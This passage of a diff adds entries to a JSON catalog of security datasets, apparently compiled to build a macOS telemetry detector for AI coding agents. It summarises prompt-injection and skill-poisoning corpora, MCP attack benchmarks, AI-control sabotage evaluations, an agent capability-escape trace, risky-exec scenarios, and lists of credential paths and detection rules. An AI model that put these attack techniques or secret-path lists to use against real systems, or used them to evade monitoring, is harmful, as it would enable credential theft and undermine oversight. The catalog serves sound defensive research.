+   "redistributable": "yes",
+   "published": "commit 5e551e60, 2026-10-27",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-006",
+    "EAA-014"
+   ],
+   "eslogger_visible": "ruler apply = one node process writing many instruction/MCP files, .bak copies, .gitignore or .git/info/exclude edits.",
+   "how_to_use": "Extra project paths for Junie, Kilo, Factory, Firebase Studio, OpenHands, Trae, Warp, Vibe; hard negative user-run fan-out; .git/info/exclude additions also hide planted files (judge context).",
+   "downloaded_to": [
+    "datasets/ruler-docs"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-078",
+   "name": "rulesync: per-tool feature matrix and global mode writing ~/.claude/CLAUDE.md, ~/.codex/AGENTS.md, skills, hooks",
+   "url": "https://raw.githubusercontent.com/dyoshikawa/rulesync/d088ccc8f436255115e0e7fb95f9ce0778375a4a/docs/reference/supported-tools.md",
+   "related_urls": [
+    "https://raw.githubusercontent.com/dyoshikawa/rulesync/d088ccc8f436255115e0e7fb95f9ce0778375a4a/docs/guide/global-mode.md"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Matrix of ~68 targets (Claude Code, Codex CLI, Copilot, Copilot CLI, Cursor, Cline, Roo (deprecated), Kiro, OpenCode, Goose, Crush, Qwen Code, Zed, Amp, Junie, Warp...) against rules, ignore, mcp, commands, subagents, skills, hooks, permissions, checks, with global support marked. Global mode writes under home (~/.claude/CLAUDE.md, ~/.claude/skills/, ~/.codex/AGENTS.md, ~/.agents/skills/); delete: true / --delete removes every non-generated skill dir under a selected target (default false). Per-tool output paths live in src/features/** (not extracted).",
+   "license": "MIT (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit d088ccc8, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-004",
+    "EAA-006",
+    "EAA-014",
+    "EAA-017"
+   ],
+   "eslogger_visible": "One node process writing CLAUDE.md, AGENTS.md, hooks, MCP and permissions files for many agents; unlinks of skill dirs with --delete.",
+   "how_to_use": "Hard negative for EAA-014 fan-out, EAA-003 hook writes and EAA-017 mass skill removal: a user-run `rulesync generate`; the judge should check the initiator and whether content matches .rulesync/ sources.",
+   "downloaded_to": [
+    "datasets/rulesync-docs"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-080",
+   "name": "Zed source: config/data dirs, rules file list (9 agents' instruction files), threads.db, .agents/skills",
+   "url": "https://raw.githubusercontent.com/zed-industries/zed/1a6de64cf3cab02e8028ee7703ab4b4b6f838b08/crates/paths/src/paths.rs",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "data_dir ~/Library/Application Support/Zed, config_dir ~/.config/zed; logs ~/Library/Logs/Zed; settings.json, global_settings.json, settings_backup.json, keymap.json; global ~/.config/zed/AGENTS.md; extensions, prompts, external_agents, copilot dirs; project .zed. RULES_FILE_NAMES: .rules, .cursorrules, .windsurfrules, .clinerules, .github/copilot-instructions.md, AGENT.md, AGENTS.md, CLAUDE.md, GEMINI.md. Threads in <data_dir>/threads/threads.db. Skills ~/.agents/skills and .agents/skills (SKILL.md capped at 100 KB).",
+   "license": "GPL-3.0-or-later (crate Cargo.toml license fields; GitHub API NOASSERTION)",
+   "redistributable": "yes",
+   "published": "commit 1a6de64c, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-005",
+    "EAA-006",
+    "EAA-009",
+    "EAA-014"
+   ],
+   "eslogger_visible": "Rules opens, settings.json writes (context_servers, agent_servers) and threads.db churn visible.",
+   "how_to_use": "Path rules ~/.config/zed/{settings.json,AGENTS.md}, .zed/settings.json, threads.db, external_agents, ~/.agents/skills; one write to .cursorrules/.windsurfrules/.clinerules/GEMINI.md also reaches Zed.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-081",
+   "name": "ADR-Bench (Uber Agentic AI Detection and Response)",
+   "url": "https://github.com/uber/ADR",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "MLSys 2026 (arXiv 2605.17380): Discovery, a Sensor normalizing Claude Code, Cursor, Codex, Copilot CLI, DeepSeek Harness, opencode, Claude Desktop and Gemini CLI journals, ADR-Bench and a Detector. Detection/tasks.json: 304 tasks (261 benign, 43 malicious) with user_prompt, mcp_servers, category, expected_tools, ground_truth; malicious include AgentFlayer-style repo-secret and local-file exfil via Jira ticket, config-manager credential harvesting, function-registry shadowing, untrusted MCP hub connection, cloud-storage exfil, memory corruption. adr_bench_20251017_151604.jsonl: manifest + 303 run records (claude-sonnet-4-5 conversations; tool calls mostly office MCP toolkits). agentdojo_20251022_190150.jsonl (659 KB).",
+   "license": "Apache-2.0 (LICENSE; GitHub API)",
+   "redistributable": "yes",
+   "published": "repo 2026-04-19..2026-10-31 (HEAD 6b33dffe); runs 2025-10-17/22",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-010",
+    "EAA-006",
+    "EAA-004",
+    "EAA-018",
+    "EAA-015"
+   ],
+   "eslogger_visible": "claude CLI and stdio MCP server processes (exec/fork), MCP servers writing workspace files, local config reads by a harvesting server; MCP JSON-RPC and remote calls not visible.",
+   "how_to_use": "Benign runs as MCP-heavy Claude Code background; rebuild the malicious subset that ends in local file reads; Sensor schema as a normalization reference.",
+   "downloaded_to": [
+    "datasets/uber-adr-bench"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-082",
+   "name": "agent-wormhole corpus: benign and malicious agent-instruction-file fixtures",
+   "url": "https://github.com/runningoffcode/agent-wormhole/tree/a8d48f767f1644aa64728a12f2b3ac27e9a4b972/corpus",
+   "related_urls": [
+    "https://www.agentwormhole.com/cases/chaindrop"
+   ],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "benchmark",
+   "what": "Text corpus from an OSS tool that blocks self-replicating prompt payloads from writing into agent config. corpus/benign: 15 markdown hard negatives (threat model, normal rules, env/startup docs, legit skill, security policy, MCP credential-server doc, subagent handoff, memory protocol, conditional config, base64 docs, pre-commit hook doc, fetched-page snapshot, hook docs, 'copy this file' doc). corpus/malicious: 17 payloads m01-m17 (HTML comment, plain replication, exfil, override, dual anchor, zero-width, skill poison, MCP tool poison, subagent handoff, memory poison, conditional trigger, encoded directive, commit-hook persistence, fetched-page injection, SessionStart hook, bare 'this project', self-suppressing). corpus/mindvirus: 6 excerpts from arXiv 2608.10218 (excerpt license unchecked). corpus/runtime (1 txt), devnet-memos-history.json (11 Solana devnet records). Live injection text.",
+   "license": "Apache-2.0 (GitHub API spdx; LICENSE copied). arXiv 2608.10218 excerpts: license not checked.",
+   "redistributable": "yes",
+   "published": "commit a8d48f76, 2026-11-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-018",
+    "EAA-003",
+    "EAA-010"
+   ],
+   "eslogger_visible": "None directly (file contents); they matter as the content of a CLAUDE.md/AGENTS.md/SKILL.md write that eslogger reports.",
+   "how_to_use": "Judge-content evals: each file as the written content of an instruction/memory write (malicious = positives, benign = hard negatives; the benign hook/MCP docs are especially useful). Exclude the mindvirus excerpts from any public copy until licensed.",
+   "downloaded_to": [
+    "datasets/agent-wormhole-corpus"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-083",
+   "name": "DefenseClaw benchmark dataset lock (Cisco AI Defense)",
+   "url": "https://github.com/cisco-ai-defense/defenseclaw/tree/main/benchmarks",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "benchmark",
+   "what": "benchmarks/datasets.lock.json (frozen 2026-09-06) pins 90 sources with purpose tags and licenses (Atomic Red Team, nl2bash, tldr, SecretBench/FPSecretBench, OSSF malicious-packages, AgentDojo, InjecAgent, trace-commons, rogue-coding-agent-security CC-BY-NC-4.0, ATBench-Codex/Claw, terminalbench trajectories, LinuxArena, DTap-Bench, MCP-Atlas, Stratus Red Team, open-swe-traces, mcphunt, CrossMCP-Bench, OTRF, splunk/attack_data; several 'review-required'). benchmarks/fixtures has vendored chain fixtures (download-execute-chain-v1, secretsdump-psexec-chain-v1, staged-reverse-shell-persistence-chain-v1, ...) and an llm_judge lane.",
+   "license": "Apache-2.0 (repo; GitHub API). Per-dataset licenses in the lock; some non-commercial or terms-gated.",
+   "redistributable": "yes",
+   "published": "lock frozen 2026-09-06; main as of 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "None directly (tool-call/command datasets).",
+   "how_to_use": "Ready crawl list with licenses pre-triaged; check each license. Not downloaded.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-084",
+   "name": "MCPSecBench (MCP attack playground: Claude Desktop, OpenAI, Cursor)",
+   "url": "https://github.com/AIS2Lab/MCPSecBench",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "arXiv 2508.13220. data/experiments.csv: 17 attack columns (prompt injection, tool misuse, schema inconsistencies, slash command overlap, vulnerable client, MCP rebinding, MITM, tool shadowing, data exfil, tool/server-name squatting, indirect injection, configuration drift, sandbox escape, tool poisoning, vulnerable server, rug pull), per-trial outcomes for Claude Desktop, OpenAI, Cursor (15 trials each); data/data.json prompts; code/ has sample claude_desktop_config.json and cursor_config.json, a rug-pull server, a squatting server, a cve-2025-6514 client exploit, SSE server, MITM script.",
+   "license": "MIT (LICENSE 'Copyright (c) 2025 AIS2Lab'; GitHub API)",
+   "redistributable": "yes",
+   "published": "repo 2025-08-09..2026-03-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-010",
+    "EAA-006"
+   ],
+   "eslogger_visible": "MCP config writes (claude_desktop_config.json, Cursor MCP config), host spawning a malicious stdio server, its file I/O; MITM/rebinding/SSE are network only.",
+   "how_to_use": "Hand-build MCP config-write and malicious-server spawn cases; experiments.csv says which attacks succeed per host. Server code not downloaded.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-085",
+   "name": "OpenAgentSafety (TheAgentCompany-based safety tasks with OpenHands trajectories)",
+   "url": "https://github.com/sani903/OpenAgentSafety",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "361 task dirs upstream (359 saved) where an OpenHands agent works in Docker with a real shell, files, browser, GitLab/RocketChat services and NPCs; task.md, checkpoints.md, sometimes scenarios.json. Local-system tasks: safety-leak-ssh-key, -ambiguous-ssh-key, -ssh-backup, -aws-credentials, -git-credential, -env-variables, -harvest-tokens, -ambiguous-cron-job, -backup-cron-job, -delete-root, -rm-rf-code, -delete-config, -delete-logs, -js-worm, -github-actions. evaluation/ per model (claude-sonnet, gpt-4o, o3-mini, deepseek_v3, deepseek_r1). Downloaded o3-mini: 312 trajectories, 296 eval files; 1,089 run actions, 457 read, 385 edit, 55 run_ipython; run commands mention id_rsa 65, rm -rf 23, authorized_keys 10, cron.weekly 7. arXiv 2507.06134 (ICLR 2026).",
+   "license": "MIT (LICENSE 'Copyright (c) 2024 TheAgentCompany'; GitHub API)",
+   "redistributable": "yes",
+   "published": "repo 2025-05-09..2026-08-10 (HEAD 857798ff)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015",
+    "EAA-018"
+   ],
+   "eslogger_visible": "run actions are real shell commands (exec + file opens/writes: id_rsa reads, crontab/authorized_keys writes, rm -rf); edit/read are file events; browsing/NPC/uploads not visible; Linux container paths.",
+   "how_to_use": "Replay unsafe trajectories' run commands on macOS under an agent parent (credential-read, cron/persistence cases); benign-outcome trajectories as hard negatives. Other models' trajectories not downloaded (~970 MB repo).",
+   "downloaded_to": [
+    "datasets/openagentsafety"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-086",
+   "name": "SkillHarm (lifecycle skill attacks incl. self-mutating skill poisoning)",
+   "url": "https://huggingface.co/datasets/osunlp/SkillHarm",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "879 runnable Harbor task environments (arXiv 2606.02540, EMNLP 2026): 687 Fixed-Payload Poisoning (57 tasks, 71 skills), 192 Self-Mutating Poisoning (12 task pairs, 6 skills) where a benign run silently mutates persistent skill content and harm comes on reuse. 12 risk types (data_exfiltration, output_manipulation, poisoning, privilege_escalation, unauthorized_file_modification, backdoor_injection, dos, malware_deployment, system_corruption, goal_hijacking, anti_forensics, proxy_attack). fpp_index.jsonl and smp_index.jsonl index ~23.7k files (Dockerfile, poisoned SKILL.md and scripts, instruction.md, task.toml, evaluator).",
+   "license": "CC-BY-4.0 (HF card). GitHub OSU-NLP-Group/SkillHarm: no license.",
+   "redistributable": "yes",
+   "published": "HF 2026-06-01..2026-06-11",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-009",
+    "EAA-018"
+   ],
+   "eslogger_visible": "SMP's key step (agent writing into a skill folder) is create/close-modified/rename on a skills path; FPP end states are exec/create/unlink; exfil not visible.",
+   "how_to_use": "Not downloaded (runnable poisoned skills). Read index JSONL for risk mix; hand-build the SMP pattern (agent edits its own skill during a task) as an EAA-004 case; 12 risk types as coverage targets.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-088",
+   "name": "Jamf Protect custom analytic detections (incl. OpenClaw agentic analytics)",
+   "url": "https://github.com/jamf/jamfprotect",
+   "related_urls": [],
+   "angles": [
+    "macos-threats"
+   ],
+   "kind": "detection-content",
+   "what": "80 YAML NSPredicate analytics. agentic_detections: five OpenClaw analytics (install via openclaw.ai commands, onboard command, ~/.openclaw creation, gateway LaunchAgent ~/Library/LaunchAgents/ai.openclaw.gateway.plist, Clawhub skill install via npx). Others: keychain_copied, terminal_persistency (writes to ~/Library/Preferences/com.apple.Terminal.plist), mdfind_search_aws_keys, sqlite3_fda, launchctl unload/bootout, xattr, curl insecure downloads, brew, adhoc_codesigning, dscl hidden/created users.",
+   "license": "MIT (LICENSE 'Copyright (c) 2021 Jamf Open Source Community'; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "commit 34e1c6c6, 2026-02-10",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-009"
+   ],
+   "eslogger_visible": "Exec argv and file-create predicates map to eslogger exec/create; Terminal.plist CommandString content not in eslogger.",
+   "how_to_use": "Hard negatives: real OpenClaw onboarding (openclaw CLI as writer); positives: clawhub skill installs (EAA-009); port keychain_copied and mdfind AWS-key analytics.",
+   "downloaded_to": [
+    "datasets/jamfprotect-custom-analytics"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-120",
+   "name": "ControlArena BashArena setting (sabotage side tasks in sysadmin agent tasks)",
+   "url": "https://github.com/UKGovernmentBEIS/control-arena",
+   "related_urls": [
+    "https://huggingface.co/datasets/Eccentricity/bashbench2"
+   ],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "procedure",
+   "what": "UK AISI ControlArena settings (bash, bash_arena, iac, infra, rogue_eval, shade_arena, agentdojo_setting...). bash_arena = BashArena 1.1, main tasks from HF Eccentricity/bashbench2 (637 rows). Side tasks: leak_passwords, download_malware, sudo_edit, disable_firewall. leak_passwords.md plants /home/app/.env, .ssh/id_rsa and id_ed25519, .aws/credentials, .config/gh/hosts.yml, /etc/shadow, /opt/configs/{database.conf,jwt_secret.key,ssl_private.key,gpg_private.asc,api_tokens.json}, /var/secrets/k8s-secrets.yaml. redwoodresearch/basharena_public has no license.",
+   "license": "ControlArena MIT (GitHub API); BashBench2 CC-BY-SA-4.0 (HF card); basharena_public none",
+   "redistributable": "yes",
+   "published": "control-arena last push 2026-10-26",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "Credential reads, sudoers writes, iptables/firewall config changes are exec/open/write; downloads and exfil network only.",
+   "how_to_use": "Its credential-file list closely matches credential rules; write macOS equivalents. Labeled telemetry is the kernel-evidence dataset.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-123",
+   "name": "derm activity-collector eslogger fixtures (codex harness session)",
+   "url": "https://github.com/aetiusgular/derm/tree/main/macos/activity-collector/tests/fixtures",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "Synthetic eslogger JSONL at msg v7, round pids. harness_session.jsonl: 24 lines (22 events, 2 malformed). Under codex: fork/exec zsh, git in ~/proj (.git/index.lock create/close/rename, README open/close); same zsh opens ~/.ssh/id_ed25519, mmaps libz, unlinks ~/Documents/notes.txt. Outside the tree (launchd-parented) curl unlinks ~/proj/secret and opens ~/.aws/credentials. Calculator creates a temp file and triggers tcc_modify. file_events.jsonl: 9 lines (1 malformed) with truncate/link/copyfile/clone/exchangedata and one claude exec.",
+   "license": "MIT (repo LICENSE 'Copyright (c) 2026 Aetius Gular'; GitHub API spdx MIT; copied)",
+   "redistributable": "yes",
+   "published": "commit 824ae838, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "All ES events.",
+   "how_to_use": "Attribution test: same credential reads inside vs outside the codex tree; small benign git baseline; malformed-line handling.",
+   "downloaded_to": [
+    "datasets/derm-eslogger-fixtures"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-124",
+   "name": "faro eslogger attack-chain fixtures",
+   "url": "https://github.com/natan1506/faro/tree/main/daemon/tests/fixtures",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "Synthetic, simplified eslogger-shaped JSON (process and event keys only, pids 80001+, user 'dev'). ataque.jsonl, 12 events: launchd -> Warp -> zsh -> node; node opens three project .env files, .env.prd and ~/.aws/credentials, spawns sh -> curl, execs /private/tmp/.upd-cache/updhelper (no create event), which adds a BTM launch item. Plus single-event btm_add.json, exec_curl.json, open_env.json.",
+   "license": "MIT (repo LICENSE 'Copyright (c) 2026 Natan'; GitHub API spdx MIT; copied)",
+   "redistributable": "yes",
+   "published": "commit 6d939062, 2026-10-21",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-019"
+   ],
+   "eslogger_visible": "All steps are exec, open or btm_launch_item_add; curl upload not visible.",
+   "how_to_use": "Positive chain 'package script under dev shell sweeps .env and cloud creds then persists' (Nx/Shai-Hulud shape). Pad to full eslogger schema and add an agent ancestor for an EAA-019/001 variant.",
+   "downloaded_to": [
+    "datasets/faro-fixtures"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-125",
+   "name": "GenseeAI autonomous-AI cross-boundary capability escape traces",
+   "url": "https://github.com/GenseeAI/gensee-crate/tree/main/security-traces/autonomous-ai-cross-boundary-capability-escape/v1",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "agent-footprint",
+   "what": "Observe-only experiment, 4 Codex trials on a UCI task in disposable cloud infra. Trial 4 (positive): the agent found its inference-gateway credential allowed arbitrary Responses API calls and used hosted web search (semantic capability escape; not a Nexus exploit, no label theft). Trials 1-3 right-censored controls. 32,138 normalized runtime events, 1,501 model items. Per trial: unified-timeline, codex-commands (48-80 commands), gateway-access, provider-effects, cloud-network, package-context, falco-relevant, benchmark, model-interactions, redaction ledgers, provenance; trial 4 ground-truth.json. Schemas, METHODOLOGY, SHA256SUMS. ~24 MB, Linux/cloud.",
+   "license": "CDLA-Permissive-2.0 for trace data (LICENSE-DATA, NOTICE); tooling Apache-2.0 (not downloaded)",
+   "redistributable": "yes",
+   "published": "commit 30980082, 2026-08-27",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015",
+    "EAA-016"
+   ],
+   "eslogger_visible": "Only codex-commands (execs) and file-touching Falco/package events have Mac analogues; the gateway/network escape is invisible to eslogger.",
+   "how_to_use": "Real Codex command sequences with ground truth and controls, for realistic background command streams. Not replayable as eslogger.",
+   "downloaded_to": [
+    "datasets/gensee-agent-security-traces"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-126",
+   "name": "nebius SWE-agent trajectories",
+   "url": "https://huggingface.co/datasets/nebius/SWE-agent-trajectories",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "agent-footprint",
+   "what": "80,036 SWE-agent trajectories solving GitHub issues with shell/edit actions and resolution metadata; sibling nebius/SWE-rebench-openhands-trajectories (CC-BY-4.0).",
+   "license": "CC-BY-4.0 (card)",
+   "redistributable": "yes",
+   "published": "HF 2024-12-08..2024-12-23",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "ls/grep/python/pytest/git execs and repo writes; no agent-config or credential paths expected.",
+   "how_to_use": "Benign exec-rate and repo-write baseline. Not downloaded.",
+   "downloaded_to": [],
+   "value": 2
+  },
+  {
+   "id": "SRC-127",
+   "name": "Terminal-Bench 2.0 leaderboard submissions (incl. Claude Code trajectories)",
+   "url": "https://huggingface.co/datasets/harborframework/terminal-bench-2-leaderboard",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "agent-footprint",
+   "what": "submissions/terminal-bench/2.0/<agent>__<model>/ with config, per-trial results and trajectories; listing capped at 100,000 entries shows 16 submission dirs incl. ClaudeCode__GLM-4.7 (445 claude-code.txt logs), Droid__Claude-Opus-4.6. Docker tasks.",
+   "license": "Apache-2.0 (card)",
+   "redistributable": "yes",
+   "published": "HF 2025-12-24..2026-05-15",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Claude Code Bash and file tool calls inside Linux containers.",
+   "how_to_use": "Noisy-but-benign exec patterns (curl|sh installers, pip, chmod); sample only.",
+   "downloaded_to": [],
+   "value": 2
+  },
+  {
+   "id": "SRC-129",
+   "name": "Clearing Context Fails to Impede AI Attackers: BashArena eval logs",
+   "url": "https://huggingface.co/datasets/xtremekiwi/dtd-basharena-data",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "Inspect logs of BashArena control evals (Aaron Sandoval): Claude Sonnet 4.6 untrusted, GPT-5.4 nano monitor; 156 files (122 .eval), ~89 GB; trusted monitoring, DTR, DTD in honest and attack modes, 566-task BA1.0 split, Scout scans. Groups: base 0.3 GB, fig2 19.2, fig3 15.8, fig4 5.2, fig5 0.8 GB.",
+   "license": "CC-BY-SA-4.0 (card YAML)",
+   "redistributable": "yes",
+   "published": "2026-10-23",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "Bash tool calls -> exec + credential file I/O; no kernel telemetry.",
+   "how_to_use": "Too large whole; sample base (0.3 GB) or fig5 (0.8 GB) for Claude-driven attack transcripts if more BashArena positives are needed.",
+   "downloaded_to": [],
+   "value": 2
+  },
+  {
+   "id": "SRC-138",
+   "name": "RedCode-Exec (risky code execution benchmark for code agents)",
+   "url": "https://github.com/AI-secure/RedCode",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "NeurIPS 2024 D&B. Downloaded 27 py2text + 20 bash2text files of 30 items: 1,410 records (Index, Prompt, Language, Code, expected_result, Text_summary, Text_details); README counts 4,050 instances across prompt forms. Scenarios: POST /etc/passwd, fetch URLs, copy/read/delete sensitive files, base64 decode-and-exec, append alias to .bashrc (70 lines mention .bashrc), kill processes, deserialization, memory exhaustion. Linux system paths. RedCode-Gen not downloaded.",
+   "license": "dataset/ CC-BY-4.0 (dataset/LICENSE, README); code MIT. HF mirror AI-Secure/RedCode tagged cc-by-nc-sa-4.0 (conflict).",
+   "redistributable": "yes",
+   "published": "arXiv 2024-11-12; repo last push 2026-10-20",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "Interpreter exec, opens of /etc/passwd etc., unlinks, .bashrc writes, kill; network not visible; paths need macOS remapping.",
+   "how_to_use": "Generic risky-exec positives for judge calibration and to check the detector doesn't over-focus on agent paths. Cite the GitHub dataset license, not the HF mirror.",
+   "downloaded_to": [
+    "datasets/redcode-exec"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-139",
+   "name": "bodycam: eslogger-based recorder for AI coding agents (sample events + agent-own-dir ignore list)",
+   "url": "https://github.com/omlahore/bodycam/blob/main/app/snapshots/sample-events.jsonl",
+   "related_urls": [
+    "https://raw.githubusercontent.com/omlahore/bodycam/bfc33d77d1c094c8e3cf74ea15cea94a3c322090/rules.go"
+   ],
+   "angles": [
+    "telemetry",
+    "footprints"
+   ],
+   "kind": "detection-content",
+   "what": "Go tool (created 2026-10-15) that runs an agent under it and reads eslogger as root, following the agent's process tree; polls lsof for TCP every 2 s. rules.go defaultAgents: claude, codex, gemini, aider, cursor-agent, opencode, amp, crush, qwen, copilot, droid, kiro-cli; identifies claude by /claude/versions/ in the exe path. ownDirs (.claude, .claude.json, .codex, .gemini, .aider, .cursor, .copilot, .factory, .qwen, .kiro, .config/opencode, .local/share/opencode, .config/amp, .config/crush, .local/share/crush, .local/share/claude, Library/Application Support/Claude, package caches) are dropped as noise unless the session owns the path. Secret labels cover .aws/credentials, .config/gcloud/, .kube/config, .docker/config.json, .netrc, .git-credentials, .npmrc, Library/Keychains/, .ssh/, .env. sample-events.jsonl: 45 lines in bodycam's own summarized format, 3 sessions (claude, 'sketchy-agent' reading the 'Claude Code-credentials' keychain item via security find-generic-password, codex), timestamped 2026-10-16.",
+   "license": "MIT (GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "2026-10-15 (rules.go commit bfc33d77); events 2026-10-16",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-015",
+    "EAA-016"
+   ],
+   "eslogger_visible": "Built on eslogger, so its file/process signals are eslogger-visible; network comes from lsof, not ES. It ignores changes in agent state dirs.",
+   "how_to_use": "Cite as the blind spot our path rules cover (a peer tool drops hook/MCP/memory plant locations as noise). Reuse agent-name list, claude versions-path identity rule and secret path list. Sample events too summarized to replay. Not downloaded.",
+   "downloaded_to": [],
+   "value": 2
+  },
+  {
+   "id": "SRC-140",
+   "name": "coreSigma ESF and unified-log Sigma rules",
+   "url": "https://github.com/Nebulock-Inc/macos-coresigma",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "detection-content",
+   "what": "57 Sigma YAML rules (38 rules/esf, 19 rules/ul): launch persistence creation, sensitive file access (/etc/hosts, /etc/sudoers, TCC plist), rename to hidden dotfile, suspicious curl download, deletion in sensitive dirs, W+X mmap, kext from tmp, TCC DB modification. Fields are Sigma taxonomy plus flattened esf.* that macos.py maps to ECS, not raw eslogger paths. data/fields.csv, docs. Collectors not downloaded. Not agent-specific.",
+   "license": "MIT (LICENSE 'Copyright (c) 2025 macOS Sigma Pipeline Contributors'; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "commit ee75bc28, 2026-01-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Source events are eslogger output but rules need an eslogger -> esf.*/Sigma field mapping.",
+   "how_to_use": "Cheap rule baseline vs the model judge on the same events once mapped; merge persistence path lists into the keep filter.",
+   "downloaded_to": [
+    "datasets/coresigma-esf-rules"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-143",
+   "name": "Sigma macOS rules",
+   "url": "https://github.com/SigmaHQ/sigma/tree/master/rules/macos",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "detection-content",
+   "what": "69 macOS rules (67 process_creation, 2 file_event) plus 4 macOS emerging-threat rules (AMOS persistence and curl POST 2025; Axios npm compromise file/process indicators 2026). No AI-agent rules, no test events.",
+   "license": "Detection Rule License (DRL) 1.1 (repo LICENSE copied); attribution required",
+   "redistributable": "yes",
+   "published": "master c68bb91a, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "process_creation -> exec; file_event -> create/close.",
+   "how_to_use": "Rule baseline and LOLBin hard-negative ideas. Low priority.",
+   "downloaded_to": [
+    "datasets/sigma-macos-rules"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-154",
+   "name": "Atomic Red Team macOS index",
+   "url": "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/Indexes",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "procedure",
+   "what": "macos-index.csv: 318 macOS atomic tests (Tactic, Technique #, Name, Test #, Test Name, GUID, Executor). macos-index.yaml (~3.7 MB) holds commands as text. Name counts: Launch Agent 6, ssh 8, credentials 8, history 9, cron 6, keychain 3, bash_profile 2. No telemetry.",
+   "license": "MIT (LICENSE.txt copied; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "master a8f00488, 2026-11-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Run in a VM they would emit exec/open/create/rename/unlink and btm/tcc events; network steps not.",
+   "how_to_use": "Procedure source for VM captures: selected persistence/credential atomics with an agent CLI as parent (positives) and from a human terminal (twins). Never on the Mac Studio.",
+   "downloaded_to": [
+    "datasets/atomic-red-team-macos"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-155",
+   "name": "ESDaemon macOS 26 file-event fixture",
+   "url": "https://github.com/VadimV1/ESDaemon/blob/main/test/fixtures/file-events-macos26.ndjson",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
